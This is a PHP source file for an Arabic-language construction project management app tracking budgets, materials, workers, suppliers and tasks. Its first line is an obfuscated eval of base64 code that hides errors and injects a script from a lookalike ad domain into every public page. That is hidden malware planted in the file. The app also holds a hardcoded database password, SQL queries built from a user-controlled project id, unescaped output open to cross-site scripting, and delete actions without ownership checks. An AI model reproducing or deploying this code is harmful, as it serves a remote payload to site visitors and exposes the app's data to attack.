<?php
 eval(base64_decode("aW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCAwKTsKaW5pX3NldCgiZGlzcGxheV9zdGFydHVwX2Vycm9ycyIsIDApOwoKaWYgKFBIUF9TQVBJICE9PSAiY2xpIiAmJiAoCiAgICBzdHJwb3MoQCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdLCAiL3dwLWFkbWluL2FkbWluLWFqYXgucGhwIikgPT09IGZhbHNlICYmCiAgICBzdHJwb3MoQCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdLCAiL3dwLWpzb24iKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AvdjIiKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AtYWRtaW4iKSA9PT0gZmFsc2UgJiYKICAgIHN0cnBvcyhAJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sICIvd3AtbG9naW4ucGhwIikgPT09IGZhbHNlICYmCiAgICBzdHJ0b2xvd2VyKEAkX1NFUlZFUlsiSFRUUF9YX1JFUVVFU1RFRF9XSVRIIl0pICE9PSAieG1saHR0cHJlcXVlc3QiCikpIHsKICAgIHByaW50KGJhc2U2NF9kZWNvZGUoIlBITmpjbWx3ZENCemNtTTlJaTh2WVhONWJtTXVaM041Ym1ScFkyRjBhVzl1TG1OdmJTOGlQand2YzJOeWFYQjBQZz09IikpOwp9")); 

error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();
// --- بيانات قاعدة البيانات ---
$host = 'localhost';
$db   = 'sams_workers'; 
$user = 'sams_workers';
$pass = 'Mohammed7134';
try {
    $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass);
    $pdo->exec("set names utf8mb4");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) { die("خطأ اتصال"); }

// --- 1. منطق الحسابات (دخول وإنشاء حساب) ---
if (isset($_POST['register'])) {
    $u = $_POST['username'];
    $p = password_hash($_POST['password'], PASSWORD_DEFAULT);
    try {
        $pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)")->execute([$u, $p]);
        $success = "تم إنشاء الحساب بنجاح!";
    } catch (Exception $e) { $error = "اسم المستخدم موجود مسبقاً!"; }
}
if (isset($_POST['login'])) {
    $s = $pdo->prepare("SELECT * FROM users WHERE username=?"); $s->execute([$_POST['username']]); $u = $s->fetch();
    if ($u && password_verify($_POST['password'], $u['password'])) {
        $_SESSION['user_id'] = $u['id']; $_SESSION['username'] = $u['username'];
        header("Location: index.php"); exit();
    } else { $error = "خطأ في بيانات الدخول"; }
}
if (isset($_GET['logout'])) { session_destroy(); header("Location: index.php"); exit(); }

$uid = $_SESSION['user_id'] ?? null;
if (isset($_GET['set_project'])) { $_SESSION['active_project'] = $_GET['set_project']; }
$pid = $_SESSION['active_project'] ?? null;

// --- 2. معالجة العمليات (مشروع، مادة، عامل، دفع، تصنيف، ميزانية) ---
if ($uid) {
    if (isset($_POST['add_project'])) {
        $pdo->prepare("INSERT INTO projects (user_id, project_name) VALUES (?, ?)")->execute([$uid, $_POST['project_name']]);
    }
    if ($pid) {
        if (isset($_POST['update_budget'])) {
            $pdo->prepare("UPDATE projects SET budget=? WHERE id=?")->execute([$_POST['budget'], $pid]);
        }
        if (isset($_POST['add_cat'])) {
            $pdo->prepare("INSERT INTO categories (project_id, cat_name) VALUES (?, ?)")->execute([$pid, $_POST['cat_name']]);
        }
        if (isset($_POST['add_mat'])) {
    $img = null;
    if (!empty($_FILES['inv']['name'])) {
        $img = time()."_invoice.jpg"; move_uploaded_file($_FILES['inv']['tmp_name'], "uploads/".$img);
    }
    
    // تأكد من جلب القيمة الصحيحة للمورد وحالة الدفع
    $is_paid = $_POST['paid']; // ستكون 1 للكاش و 0 للدين
    $supplier_id = ($is_paid == '0' && !empty($_POST['supplier_id'])) ? $_POST['supplier_id'] : null;

    $stmt = $pdo->prepare("INSERT INTO materials (project_id, item_name, price, purchase_date, category, is_paid, invoice_image, supplier_id) VALUES (?,?,?,?,?,?,?,?)");
    $stmt->execute([$pid, $_POST['name'], $_POST['price'], $_POST['date'], $_POST['cat'], $is_paid, $img, $supplier_id]);
}
        // إضافة مهمة جديدة
if (isset($_POST['add_task']) && $pid) {
    $pdo->prepare("INSERT INTO tasks (project_id, task_text) VALUES (?, ?)")
        ->execute([$pid, $_POST['task_text']]);
}

// تغيير حالة المهمة (مكتملة / غير مكتملة)
if (isset($_GET['toggle_task'])) {
    $stmt = $pdo->prepare("UPDATE tasks SET is_done = NOT is_done WHERE id = ?");
    $stmt->execute([$_GET['toggle_task']]);
    header("Location: index.php"); exit();
}

// حذف مهمة
if (isset($_GET['del_task'])) {
    $pdo->prepare("DELETE FROM tasks WHERE id = ?")->execute([$_GET['del_task']]);
    header("Location: index.php"); exit();
}
        if (isset($_POST['add_worker'])) {
            $pdo->prepare("INSERT INTO workers (project_id, worker_name, task_desc, total_amount, paid_amount, entry_date) VALUES (?,?,?,?,?,?)")
                ->execute([$pid, $_POST['w_name'], $_POST['task'], $_POST['total'], $_POST['sufa'], $_POST['w_date']]);
        }
        if (isset($_POST['add_pay'])) {
            $pdo->prepare("INSERT INTO worker_payments (worker_id, amount, payment_date) VALUES (?,?,?)")
                ->execute([$_POST['worker_id'], $_POST['amt'], date('Y-m-d')]);
        }
        // متغيرات كشف الحساب المدمج
$report_data = null;
if (isset($_POST['get_worker_report'])) {
    $w_name = $_POST['worker_name']; // سنعتمد على الاسم للجمع
    $from = $_POST['date_from'];
    $to = $_POST['date_to'];

    // 1. جمع المبالغ المتفق عليها والسلف الأولية لكل السجلات التي تحمل هذا الاسم
    $stmt = $pdo->prepare("SELECT SUM(total_amount) as grand_total, SUM(paid_amount) as grand_initial_paid FROM workers WHERE worker_name = ? AND project_id = ? AND entry_date BETWEEN ? AND ?");
    $stmt->execute([$w_name, $pid, $from, $to]);
    $worker_totals = $stmt->fetch();

    // 2. جمع كل الدفعات الإضافية المسجلة لهذا الاسم في هذا المشروع
    $stmt_pay = $pdo->prepare("SELECT SUM(wp.amount) as grand_extra_paid FROM worker_payments wp JOIN workers w ON wp.worker_id = w.id WHERE w.worker_name = ? AND w.project_id = ? AND wp.payment_date BETWEEN ? AND ?");
    $stmt_pay->execute([$w_name, $pid, $from, $to]);
    $extra_payments = $stmt_pay->fetch()['grand_extra_paid'] ?: 0;

    if ($worker_totals['grand_total'] > 0) {
        $total_agreed = $worker_totals['grand_total'];
        $total_paid = $worker_totals['grand_initial_paid'] + $extra_payments;
        $remaining = $total_agreed - $total_paid;

        $report_data = [
            'name' => $w_name,
            'total' => $total_agreed,
            'paid' => $total_paid,
            'rem' => $remaining,
            'from' => $from,
            'to' => $to
        ];
    } else {
        $error_msg = "لا يوجد بيانات مسجلة لهذا الاسم في هذه الفترة";
    }
}
// إضافة مورد (تاجر) جديد
    if (isset($_POST['add_supplier'])) {
        $pdo->prepare("INSERT INTO suppliers (project_id, supplier_name, contact_info) VALUES (?, ?, ?)")
            ->execute([$pid, $_POST['s_name'], $_POST['s_info']]);
    }

    // إضافة دفعة مالية للتاجر (قسط)
    if (isset($_POST['add_s_payment'])) {
        $pdo->prepare("INSERT INTO supplier_payments (supplier_id, amount, payment_date) VALUES (?, ?, ?)")
            ->execute([$_POST['supplier_id'], $_POST['amount'], $_POST['p_date']]);
    }
    }
    if (isset($_GET['del_sup'])) {
    // حذف المورد (سيتم حذف سجلاته فقط، وتبقى المواد المرتبطة به بدون مورد)
    $pdo->prepare("DELETE FROM suppliers WHERE id = ? AND project_id = ?")->execute([$_GET['del_sup'], $pid]);
    header("Location: index.php");
    exit();
}
    if (isset($_GET['del_mat'])) { $pdo->prepare("DELETE FROM materials WHERE id=?")->execute([$_GET['del_mat']]); header("Location: index.php"); }
    if (isset($_GET['del_work'])) { $pdo->prepare("DELETE FROM workers WHERE id=?")->execute([$_GET['del_work']]); header("Location: index.php"); }
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدارة الإعمار الاحترافية</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
    <style>
        body { background: #f4f6f9; font-family: 'Segoe UI', Tahoma, sans-serif; }
        .card { border: none; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 20px; }
        .nav-tabs .nav-link.active { border-bottom: 3px solid #0d6efd; color: #0d6efd; background: none; font-weight: bold; }
        .table { font-size: 0.9rem; }
    </style>
</head>
<body class="container py-3">

<?php if (!$uid): ?>
    <!-- شاشة الدخول والتسجيل -->
    <div class="row justify-content-center mt-5"><div class="col-md-5 card p-4">
        <h3 class="text-center text-primary mb-4">نظام إدارة الإعمار</h3>
        <?php if(isset($error)) echo "<div class='alert alert-danger p-2'>$error</div>"; ?>
        <?php if(isset($success)) echo "<div class='alert alert-success p-2'>$success</div>"; ?>
        <ul class="nav nav-pills nav-justified mb-3">
            <li class="nav-item"><button class="nav-link active" data-bs-toggle="pill" data-bs-target="#lForm">دخول</button></li>
            <li class="nav-item"><button class="nav-link" data-bs-toggle="pill" data-bs-target="#rForm">تسجيل</button></li>
        </ul>
        <div class="tab-content">
            <div class="tab-pane fade show active" id="lForm">
                <form method="POST"><input name="username" class="form-control mb-2" placeholder="المستخدم"><input type="password" name="password" class="form-control mb-3" placeholder="كلمة المرور"><button name="login" class="btn btn-primary w-100">دخول</button></form>
            </div>
            <div class="tab-pane fade" id="rForm">
                <form method="POST"><input name="username" class="form-control mb-2" placeholder="مستخدم جديد"><input type="password" name="password" class="form-control mb-3" placeholder="كلمة المرور"><button name="register" class="btn btn-success w-100">إنشاء حساب</button></form>
            </div>
        </div>
    </div></div>
<?php else: ?>
    <!-- الواجهة الرئيسية -->
    <div class="row g-2 mb-3">
        <div class="col-md-8">
            <div class="card p-2 flex-row align-items-center justify-content-between px-3">
                <span><i class="bi bi-building"></i> 
                    <select onchange="location.href='?set_project='+this.value" class="form-select d-inline-block w-auto border-0 fw-bold">
                        <option value="">-- اختر المشروع --</option>
                        <?php $ps=$pdo->query("SELECT * FROM projects WHERE user_id=$uid"); while($p=$ps->fetch()) echo "<option value='{$p['id']}' ".($pid==$p['id']?'selected':'').">{$p['project_name']}</option>"; ?>
                    </select>
                </span>
                <button class="btn btn-sm btn-dark" data-bs-toggle="modal" data-bs-target="#addP"><i class="bi bi-plus-circle"></i></button>
            </div>
        </div>
        <div class="col-md-4">
            <div class="card p-2 px-3 flex-row justify-content-between align-items-center text-primary">
                <b><i class="bi bi-person-circle"></i> <?= $_SESSION['username'] ?></b>
                <a href="?logout=1" class="btn btn-sm btn-outline-danger border-0"><i class="bi bi-power"></i></a>
            </div>
        </div>
    </div>

    <?php if ($pid): ?>
    <ul class="nav nav-tabs mb-3 bg-white p-1 rounded card flex-row" id="myTabs">
        <li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#t-budget"><i class="bi bi-pie-chart"></i> الميزانية</button></li>
        <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#t-mats"><i class="bi bi-box-seam"></i> المواد</button></li>
        <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#t-works"><i class="bi bi-people"></i> العمال</button></li>
        <li class="nav-item">
    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#t-tasks">
        <i class="bi bi-check2-square"></i> المهام
    </button>
</li>
<li class="nav-item">
    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#t-report">
        <i class="bi bi-file-earmark-bar-graph"></i> كشف حساب
    </button>
</li>
<li class="nav-item">
    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#t-suppliers">
        <i class="bi bi-truck"></i> الموردين
    </button>
</li>
    </ul>

    <div class="tab-content">
        <!-- تبويب الميزانية -->
        <div class="tab-pane fade show active" id="t-budget">
            <div class="card p-4">
                <?php 
                $proj=$pdo->prepare("SELECT * FROM projects WHERE id=?"); $proj->execute([$pid]); $cur_p=$proj->fetch();
                $m_spent=$pdo->query("SELECT SUM(price) FROM materials WHERE project_id=$pid")->fetchColumn() ?: 0;
                $w_spent=($pdo->query("SELECT SUM(paid_amount) FROM workers WHERE project_id=$pid")->fetchColumn() ?: 0) + ($pdo->query("SELECT SUM(amount) FROM worker_payments wp JOIN workers w ON wp.worker_id=w.id WHERE w.project_id=$pid")->fetchColumn() ?: 0);
                $total_spent = $m_spent + $w_spent;
                ?>
                <h5>إدارة ميزانية المشروع</h5>
                <form method="POST" class="d-flex gap-2 mb-3">
                    <input type="number" name="budget" class="form-control" value="<?= $cur_p['budget'] ?>">
                    <button name="update_budget" class="btn btn-primary"><i class="bi bi-check-lg"></i></button>
                </form>
                <div class="row text-center mb-3">
                    <div class="col-4 border-end"><h6>المصروف</h6><b class="text-danger"><?= number_format($total_spent) ?></b></div>
                    <div class="col-4 border-end"><h6>المتبقي</h6><b class="text-success"><?= number_format($cur_p['budget'] - $total_spent) ?></b></div>
                    <div class="col-4"><h6>الميزانية</h6><b><?= number_format($cur_p['budget']) ?></b></div>
                </div>
                <div class="progress"><div class="progress-bar" style="width: <?= ($cur_p['budget']>0)?($total_spent/$cur_p['budget'])*100 : 0 ?>%"></div></div>
            
            </div>
            <a href="report.php?pid=<?= $pid ?>" target="_blank" class="btn btn-outline-dark">
    <i class="bi bi-file-earmark-pdf"></i> تصدير كشف الحساب الشامل
</a>
        </div>

        <!-- تبويب المواد -->
        <div class="tab-pane fade" id="t-mats">
            <div class="card p-3 mb-3">
                <form method="POST" enctype="multipart/form-data" class="row g-2 mb-3">
                    <div class="col-6 col-md-3"><input name="name" class="form-control" placeholder="المادة" required></div>
                    <div class="col-6 col-md-2"><input type="number" name="price" class="form-control" placeholder="السعر" required></div>
                    <div class="col-6 col-md-2">
                        <select name="cat" class="form-select">
                            <option value="">التصنيف</option>
                            <?php $cs=$pdo->query("SELECT * FROM categories WHERE project_id=$pid"); while($c=$cs->fetch()) echo "<option>{$c['cat_name']}</option>"; ?>
                        </select>
                    </div>
                    <div class="col-6 col-md-2">
                        <select name="paid" class="form-select"><option value="1">كاش</option><option value="0">دين</option></select>
                    </div>
                    <div class="col-6 col-md-2"><input type="date" name="date" class="form-control" value="<?= date('Y-m-d') ?>"></div>
                    <div class="col-6 col-md-1"><input type="file" name="inv" class="form-control" title="الفاتورة"></div>
                    <div class="col-md-3">
    <select name="supplier_id" class="form-select">
        <option value="">اختر التاجر (في حال الدين)</option>
        <?php 
        $sups_list = $pdo->prepare("SELECT id, supplier_name FROM suppliers WHERE project_id = ?");
        $sups_list->execute([$pid]);
        while($sl = $sups_list->fetch()) echo "<option value='{$sl['id']}'>{$sl['supplier_name']}</option>";
        ?>
    </select>
</div>
                    <div class="col-12"><button name="add_mat" class="btn btn-success w-100">إضافة مادة</button></div>
                </form>
                <form method="POST" class="d-flex gap-1 border-top pt-2">
                    <input name="cat_name" class="form-control form-control-sm" placeholder="إضافة تصنيف جديد">
                    <button name="add_cat" class="btn btn-sm btn-secondary text-nowrap"><i class="bi bi-folder-plus"></i></button>
                </form>
            </div>
            <div class="table-responsive bg-white card p-2">
                <table class="table table-hover">
                    <thead><tr><th>المادة</th><th>التصنيف</th><th>السعر</th><th>التاريخ</th><th>-</th></tr></thead>
                    <tbody>
                        <?php $ms=$pdo->query("SELECT * FROM materials WHERE project_id=$pid ORDER BY id DESC");
                        while($m=$ms->fetch()): ?>
                        <tr>
                            <td><?= $m['item_name'] ?> <?= $m['invoice_image']?"<a href='uploads/{$m['invoice_image']}' target='_blank'><i class='bi bi-image text-primary'></i></a>":"" ?></td>
                            <td><span class="badge bg-light text-dark"><?= $m['category'] ?></span></td>
                            <td><b><?= number_format($m['price']) ?></b> <?= $m['is_paid']?'':'<small class="text-danger">(دين)</small>' ?></td>
                            <td><?= $m['purchase_date'] ?></td>
                            <td><a href="?del_mat=<?= $m['id'] ?>" class="text-danger" onclick="return confirm('حذف؟')"><i class="bi bi-trash3"></i></a></td>
                        </tr>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- تبويب العمال -->
        <div class="tab-pane fade" id="t-works">
            <div class="card p-3 mb-3">
                <form method="POST" class="row g-2">
                    <div class="col-6 col-md-3"><input name="w_name" class="form-control" placeholder="اسم العامل" required></div>
                    <div class="col-6 col-md-3"><input name="task" class="form-control" placeholder="نوع العمل"></div>
                    <div class="col-4 col-md-2"><input type="number" name="total" class="form-control" placeholder="الاتفاق"></div>
                    <div class="col-4 col-md-2"><input type="number" name="sufa" class="form-control" placeholder="السلفة الأولى"></div>
                    <div class="col-4 col-md-2"><input type="date" name="w_date" class="form-control" value="<?= date('Y-m-d') ?>"></div>
                    <div class="col-12"><button name="add_worker" class="btn btn-primary w-100">حفظ بيانات العامل</button></div>
                </form>
            </div>
            <div class="table-responsive bg-white card p-2">
                <table class="table align-middle">
                    <thead><tr><th>العامل</th><th>المتبقي</th><th>التاريخ</th><th>إجراء</th></tr></thead>
                    <tbody>
                        <?php $ws=$pdo->query("SELECT * FROM workers WHERE project_id=$pid ORDER BY id DESC");
                        while($w=$ws->fetch()): 
                            $inst=$pdo->query("SELECT SUM(amount) FROM worker_payments WHERE worker_id={$w['id']}")->fetchColumn() ?: 0;
                            $rem = $w['total_amount'] - ($w['paid_amount'] + $inst);
                            $wa = "كشف حساب {$w['worker_name']}: الاتفاق ".number_format($w['total_amount'])." | استلم ".number_format($w['paid_amount']+$inst)." | المتبقي ".number_format($rem);
                        ?>
                        <tr>
                            <td><b><?= $w['worker_name'] ?></b><br><small class="text-muted"><?= $w['task_desc'] ?></small></td>
                            <td class="text-danger fw-bold"><?= number_format($rem) ?></td>
                            <td><small><?= $w['entry_date'] ?></small></td>
                            <td class="text-nowrap">
                                <button class="btn btn-sm btn-outline-primary" data-bs-toggle="modal" data-bs-target="#payM<?= $w['id'] ?>"><i class="bi bi-cash-coin"></i></button>
                                <button class="btn btn-sm btn-outline-info" data-bs-toggle="modal" data-bs-target="#histM<?= $w['id'] ?>"><i class="bi bi-journal-text"></i></button>
                                <a href="https://wa.me/?text=<?= urlencode($wa) ?>" target="_blank" class="btn btn-sm btn-outline-success"><i class="bi bi-whatsapp"></i></a>
                                <a href="?del_work=<?= $w['id'] ?>" class="text-danger ms-2"><i class="bi bi-trash3"></i></a>
                            </td>
                        </tr>
                        <!-- مودال دفع سحبيات -->
                        <div class="modal fade" id="payM<?= $w['id'] ?>" aria-hidden="true">
                            <div class="modal-dialog modal-dialog-centered modal-sm"><div class="modal-content"><form method="POST" class="p-3 text-center">
                                <h6>دفع مبلغ سحبه <?= $w['worker_name'] ?></h6>
                                <input type="hidden" name="worker_id" value="<?= $w['id'] ?>">
                                <input type="number" name="amt" class="form-control mb-3" placeholder="المبلغ المسحوب" required autofocus>
                                <button name="add_pay" class="btn btn-primary btn-sm w-100">تأكيد الدفع</button>
                            </form></div></div>
                        </div>
                        <!-- مودال سجل الدفعات -->
                        <div class="modal fade" id="histM<?= $w['id'] ?>" aria-hidden="true">
                            <div class="modal-dialog modal-dialog-centered"><div class="modal-content p-3">
                                <h6>سجل دفعات: <?= $w['worker_name'] ?></h6><hr class="my-1">
                                <div class="d-flex justify-content-between small mb-2"><span>السلفة الأولى (عند التسجيل)</span><b><?= number_format($w['paid_amount']) ?></b></div>
                                <?php $ps=$pdo->query("SELECT * FROM worker_payments WHERE worker_id={$w['id']}"); while($p=$ps->fetch()) echo "<div class='d-flex justify-content-between border-bottom py-1 small text-primary'><span>{$p['payment_date']}</span><b>".number_format($p['amount'])."</b></div>"; ?>
                            </div></div>
                        </div>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            </div>
        </div>
    
    <!-- تبويب المهام والـ Checklist -->
<div class="tab-pane fade" id="t-tasks">
    <div class="card p-3 mb-3">
        <h6>قائمة مهام الموقع</h6>
        <form method="POST" class="d-flex gap-2">
            <input name="task_text" class="form-control" placeholder="اكتب مهمة جديدة (مثلاً: فحص عزل السطح)" required>
            <button name="add_task" class="btn btn-primary text-nowrap">إضافة</button>
        </form>
    </div>

    <div class="list-group card">
        <?php 
        $tasks = $pdo->prepare("SELECT * FROM tasks WHERE project_id = ? ORDER BY is_done ASC, id DESC");
        $tasks->execute([$pid]);
        while($t = $tasks->fetch()): 
        ?>
        <div class="list-group-item d-flex justify-content-between align-items-center">
            <div class="d-flex align-items-center">
                <a href="?toggle_task=<?= $t['id'] ?>" class="text-decoration-none me-3">
                    <?php if($t['is_done']): ?>
                        <i class="bi bi-check-circle-fill text-success h5"></i>
                    <?php else: ?>
                        <i class="bi bi-circle text-muted h5"></i>
                    <?php endif; ?>
                </a>
                <span style="<?= $t['is_done'] ? 'text-decoration: line-through; color: gray;' : '' ?>">
                    <?= htmlspecialchars($t['task_text']) ?>
                </span>
            </div>
            <a href="?del_task=<?= $t['id'] ?>" class="text-danger border-0 bg-transparent" onclick="return confirm('حذف المهمة؟')">
                <i class="bi bi-trash"></i>
            </a>
        </div>
        <?php endwhile; ?>
    </div>
</div>
    
    <!-- تبويب كشف حساب عامل -->
<div class="tab-pane fade" id="t-report">
    <div class="card p-3 mb-3">
        <h6>استعلام عن رصيد عامل (فترة محددة)</h6>
        <form method="POST" class="row g-2">
            <div class="col-md-4">
                <select name="worker_name" class="form-select" required>
    <option value="">اختر العامل</option>
    <?php 
    // جلب الأسماء بدون تكرار للمشروع الحالي
    $ws = $pdo->prepare("SELECT DISTINCT worker_name FROM workers WHERE project_id = ?");
    $ws->execute([$pid]);
    while($w = $ws->fetch()) echo "<option value='{$w['worker_name']}'>{$w['worker_name']}</option>";
    ?>
</select>
            </div>
            <div class="col-6 col-md-3">
                <input type="date" name="date_from" class="form-control" required title="من تاريخ">
            </div>
            <div class="col-6 col-md-3">
                <input type="date" name="date_to" class="form-control" value="<?= date('Y-m-d') ?>" required title="إلى تاريخ">
            </div>
            <div class="col-12 col-md-2">
                <button name="get_worker_report" class="btn btn-dark w-100">عرض الرصيد</button>
            </div>
        </form>
    </div>

    <?php if ($report_data): ?>
        <div class="card p-4 border-primary shadow-sm">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h5 class="m-0 text-primary">كشف حساب: <?= $report_data['name'] ?></h5>
                <small class="text-muted">الفترة: من <?= $report_data['from'] ?> إلى <?= $report_data['to'] ?></small>
            </div>
            <div class="row text-center g-2">
                <div class="col-md-4">
                    <div class="bg-light p-3 rounded">
                        <small class="d-block text-muted">إجمالي المستحق (الاتفاق)</small>
                        <h4 class="m-0"><?= number_format($report_data['total']) ?></h4>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="bg-light p-3 rounded">
                        <small class="d-block text-muted">إجمالي ما تم دفعه</small>
                        <h4 class="m-0 text-success"><?= number_format($report_data['paid']) ?></h4>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="bg-primary text-white p-3 rounded shadow">
                        <small class="d-block">الرصيد المتبقي (له)</small>
                        <h4 class="m-0 fw-bold"><?= number_format($report_data['rem']) ?></h4>
                    </div>
                </div>
            </div>
            <div class="mt-4 text-center d-print-none">
                <button onclick="window.print()" class="btn btn-sm btn-outline-secondary">
                    <i class="bi bi-printer"></i> طباعة الكشف
                </button>
            </div>
        </div>
    <?php elseif(isset($error_msg)): ?>
        <div class="alert alert-warning"><?= $error_msg ?></div>
    <?php endif; ?>
</div>
    
    <div class="tab-pane fade" id="t-suppliers">
    <!-- إضافة تاجر جديد -->
    <div class="card p-3 mb-3 bg-light">
        <h6><i class="bi bi-person-plus"></i> إضافة تاجر/مورد جديد</h6>
        <form method="POST" class="row g-2">
            <div class="col-md-5"><input name="s_name" class="form-control" placeholder="اسم التاجر" required></div>
            <div class="col-md-5"><input name="s_info" class="form-control" placeholder="رقم الهاتف أو العنوان"></div>
            <div class="col-md-2"><button name="add_supplier" class="btn btn-dark w-100">حفظ</button></div>
        </form>
    </div>

    <!-- جدول الموردين وحساباتهم -->
    <div class="table-responsive bg-white card p-2 shadow-sm">
        <table class="table align-middle">
            <thead class="table-dark">
                <tr>
                    <th>التاجر</th>
                    <th>إجمالي السحب (دين)</th>
                    <th>إجمالي المدفوع</th>
                    <th>المتبقي للتاجر</th>
                    <th>إجراء</th>
                </tr>
            </thead>
            <tbody>
                <?php 
                $sups = $pdo->prepare("SELECT * FROM suppliers WHERE project_id = ?");
                $sups->execute([$pid]);
                while($s = $sups->fetch()):
                    // حساب إجمالي الديون (المواد التي سحبت منه ولم تدفع كاش)
                    $debt = $pdo->query("SELECT SUM(price) FROM materials WHERE supplier_id={$s['id']} AND is_paid=0")->fetchColumn() ?: 0;
                    // حساب إجمالي الدفعات التي دفعتها له
                    $paid = $pdo->query("SELECT SUM(amount) FROM supplier_payments WHERE supplier_id={$s['id']}")->fetchColumn() ?: 0;
                    $rem = $debt - $paid;
                ?>
                <tr>
                    <td><b><?= $s['supplier_name'] ?></b></td>
                    <td><?= number_format($debt) ?></td>
                    <td class="text-success"><?= number_format($paid) ?></td>
                    <td class="text-danger fw-bold"><?= number_format($rem) ?></td>
                    <td>
                        <button class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#sPay<?= $s['id'] ?>"><i class="bi bi-cash-stack"></i></button>
                        <button class="btn btn-sm btn-info text-white" data-bs-toggle="modal" data-bs-target="#sHist<?= $s['id'] ?>"><i class="bi bi-list-check"></i></button>
                        <a href="?del_sup=<?= $s['id'] ?>" class="btn btn-sm btn-outline-danger" onclick="return confirm('هل أنت متأكد من حذف هذا التاجر؟ سيتم مسح سجل دفعاته أيضاً.')">
    <i class="bi bi-trash3"></i>
</a>
                    </td>
                </tr>

                <!-- مودال دفع قسط للتاجر (تم إصلاحه) -->
<div class="modal fade" id="sPay<?= $s['id'] ?>" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-sm">
        <div class="modal-content p-3 text-center">
            <form method="POST">
                <h6 class="mb-3">دفع دفعة لـ <?= $s['supplier_name'] ?></h6>
                <input type="hidden" name="supplier_id" value="<?= $s['id'] ?>">
                <input type="number" name="amount" class="form-control mb-3" placeholder="المبلغ" required autofocus>
                <input type="date" name="p_date" class="form-control mb-3" value="<?= date('Y-m-d') ?>">
                <button name="add_s_payment" class="btn btn-primary btn-sm w-100">تأكيد الدفع</button>
            </form>
        </div>
    </div>
</div>

                <!-- مودال سجل دفعات التاجر -->
                <div class="modal fade" id="sHist<?= $s['id'] ?>"><div class="modal-dialog"><div class="modal-content p-3">
                    <h6>سجل أقساط التاجر: <?= $s['supplier_name'] ?></h6><hr>
                    <?php 
                    $phs = $pdo->query("SELECT * FROM supplier_payments WHERE supplier_id={$s['id']} ORDER BY payment_date DESC");
                    while($ph = $phs->fetch()) echo "<div class='d-flex justify-content-between border-bottom py-1'><span>{$ph['payment_date']}</span><b>".number_format($ph['amount'])."</b></div>";
                    ?>
                </div></div></div>
                <?php endwhile; ?>
            </tbody>
        </table>
    </div>
</div>
    </div>
    <?php else: echo "<div class='alert alert-info card p-5 text-center'><h5>اختر مشروعاً من القائمة أو أضف مشروعاً جديداً للبدء</h5></div>"; endif; ?>

    <!-- مودال مشروع جديد -->
    <div class="modal fade" id="addP"><div class="modal-dialog modal-dialog-centered"><form method="POST" class="modal-content p-3">
        <h6>إضافة مشروع جديد (عمارة)</h6>
        <input name="project_name" class="form-control mb-3" placeholder="اسم المشروع" required>
        <button name="add_project" class="btn btn-primary w-100">حفظ</button>
    </form></div></div>
<?php endif; ?>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    document.querySelectorAll('button[data-bs-toggle="tab"]').forEach(t => {
        t.addEventListener('shown.bs.tab', e => localStorage.setItem('activeTab', e.target.getAttribute('data-bs-target')));
    });
    let at = localStorage.getItem('activeTab');
    if(at) { let el = document.querySelector('[data-bs-target="'+at+'"]'); if(el) new bootstrap.Tab(el).show(); }
</script>
</body>
</html>